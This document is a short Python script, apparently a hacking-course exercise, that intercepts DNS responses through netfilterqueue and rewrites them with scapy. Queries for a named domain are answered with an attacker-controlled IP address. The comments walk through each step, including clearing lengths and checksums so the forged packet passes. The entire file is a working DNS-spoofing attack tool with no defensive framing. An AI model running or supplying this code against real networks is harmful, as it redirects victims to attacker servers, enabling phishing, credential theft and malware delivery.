# !/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import re


# this dns spoofer only for http sites
site_dns_attack = "e-m-b.org"

# your server in computer hack
fack_site = "192.168.57.137"


def process_packet(packet):
    '''
        packet.accept() accept the packet and connection throw
        packet.drop() cut the internet connection :)
        packet.get_payload() show all info about packet like scapy
        but we need scapy to add packet to it because i need to deal with this packet as snifft
    '''

    # here we add packet to IP layer in scapy
    scapy_packet = scapy.IP(packet.get_payload())

    # DNSRQ dns request, DNSRR dns response
    if scapy_packet.haslayer(scapy.DNSRR):
        # print(scapy_packet)
        qname = scapy_packet[scapy.DNSQR].qname
        if site_dns_attack in str(qname):
            print('[+] Spoofing target')
            answer = scapy.DNSRR(rrname=qname, rdata=fack_site)
            # change answer
            scapy_packet[scapy.DNS].an = answer

            # change count of answer to 1 because we add one answer
            scapy_packet[scapy.DNS].ancount = 1

            # delete all feild can interrubt our answer and scapy will return calc it and add it
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            # add our modified to the orginal packet
            packet.set_payload(bytes(scapy_packet))

    # accept the packet and make it throw :)
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
